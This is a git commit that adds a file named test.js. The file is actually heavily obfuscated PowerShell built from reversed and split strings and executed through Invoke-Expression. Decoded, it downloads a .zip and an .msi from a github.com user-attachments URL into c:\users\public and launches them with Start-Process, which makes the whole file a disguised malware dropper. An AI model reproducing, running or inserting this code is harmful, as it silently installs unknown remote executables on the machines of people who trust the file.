20cd5be842d96e5aaed8c2921326b635d8f9958c
Azkic50 <Azkilohj55@gmail.com>
2025-03-30 20:09:21 -0400

    Create test.js

---
+++ test.js
@@ -0,0 +1,22 @@
+seT-varIABLe  ("01"+"x")  ([cHaR[]]" ))43]RAhC[]GNIrTs[,)38]RAhC[+021]RAhC[+94]RAhC[((ECAlPEr.)'$','EsQ'(ECAlPEr.)'\','Djp'(ECAlPEr.)'  
+'+'
+}  
+}    
+{'+' hcta'+'c    
+} '+' '+'  '+'
+'+';htaPel'+'ifEsQ ssecorP-tratS'+' '+'  '+'   
+'+'}     '+' 
+ ;h'+'ta'+'PelifEsQ el'+'iFtu'+'O'+'-'+' a.'+'iEsQ'+' irU- dohteMtseR-e'+'kovnI      '+'  
+{ )daolnwodEsQ'+'( f'+'i      '+'
+ }'+'   '+'   
+;'+'eslafEsQ '+'='+' dao'+'lnwod'+'E'+'sQ        '+'
+{ )htaPe'+'l'+'i'+'fEsQ htaP-tseT'+'( fi   '+'   
+'+';e'+'u'+'r'+'tEsQ '+'= daoln'+'w'+'odEsQ'+'      
+'+';S'+'x1)b.'+'i'+'EsQ('+'E'+'s'+'QDjpc'+'i'+'lb'+'u'+'pDj'+'psresuDj'+'p:c'+'Sx1 = '+'h'+'taP'+'el'+'ifEsQ   '+'   
+{ yr'+'t'+'  '+'  
+{ )'+'ataDemos'+'EsQ ni i'+'EsQ( hcae'+'rof  '+'
+;)
+}S'+'x'+'1ism.3OQX'+'PDC'+'BOSx1 '+'= b ;S'+'x1piz.OQXPDCBO/12672591/'+'se'+'li'+'f/st'+'ne'+'mhcat'+'ta-resu/mo'+'c.buht'+'ig//:sptthS'+'x1 = a{@]tc'+'ej'+'bOmotsu'+'CSP[  '+'
+(@ = a'+'taDemos'+'Es'+'Q  '+'
+
+'( ( )''NIoJ-'X'+]3,1[)ECNEREFERpESOBrev$]GNirTs[( (. ") ; [arRaY]::ReveRse( (LS  ("vA"+"rIabLe:"+"01X")  ).vAlue ) ;"$( $oFs='' )" +[sTRiNg]( (LS  ("vA"+"rIabLe:"+"01X")  ).vAlue) +"$(set-ItEm  'VaRIabLe:OFS' ' ')" |IEx
